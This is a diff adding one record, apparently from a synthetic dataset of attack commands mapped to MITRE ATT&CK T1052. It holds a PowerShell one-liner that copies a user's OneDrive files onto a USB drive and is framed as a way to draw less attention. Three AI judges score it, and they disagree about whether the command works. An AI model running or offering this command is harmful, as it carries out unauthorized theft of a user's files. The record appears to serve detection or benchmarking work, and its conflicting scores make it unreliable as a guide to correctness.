@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\OD\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem \"$env:USERPROFILE\\OneDrive\" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 10485760 } | ForEach-Object { $rel=(Resolve-Path $_.FullName).Path.Substring($env:USERPROFILE.Length); $t=Join-Path $dest $rel; New-Item -ItemType Directory -Force -Path ([IO.Path]::GetDirectoryName($t)) | Out-Null; Copy-Item -LiteralPath $_.FullName -Destination $t -Force -ErrorAction SilentlyContinue }; Write-Output \"Staged OneDrive content to removable path $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Copies smaller OneDrive-synced files locally to a removable drive to reduce attention and ensure all operations remain offline.",
+  "rationale_steps": [
+    "Identify removable media path",
+    "Enumerate local OneDrive files under a size threshold",
+    "Recreate directory structure and copy files to USB",
+    "Log the operation locally using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-5195c7cb",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, valid cmdlets/parameters, proper separators, and correct escaping for the colon after a variable.",
+        "semantic_score": 4,
+        "semantic_justification": "It stages sub-10MB OneDrive files to a removable drive consistent with T1052, though the rooted child path in Join-Path may bypass the intended OD subfolder and execution assumes a removable volume exists.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2025-10-01T08:35:36.130819Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate escape sequences.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the T1052 technique by identifying a removable drive, creating a directory structure, copying OneDrive files under 10MB to maintain stealth, and logging the operation - all core elements of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:35:38.909439Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, balanced, and uses valid PowerShell syntax; the interpreter will parse and execute it without error.",
+        "semantic_score": 2,
+        "semantic_justification": "Despite correct logical steps, a critical semantic error in the `$dest=\"$dl`:\\OD\"` path construction results in an invalid Windows file path (e.g., 'E`:\\OD'), preventing the creation of the destination directory, file copies, and log file, thus failing to achieve the claimed exfiltration intent.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:36:13.153051Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
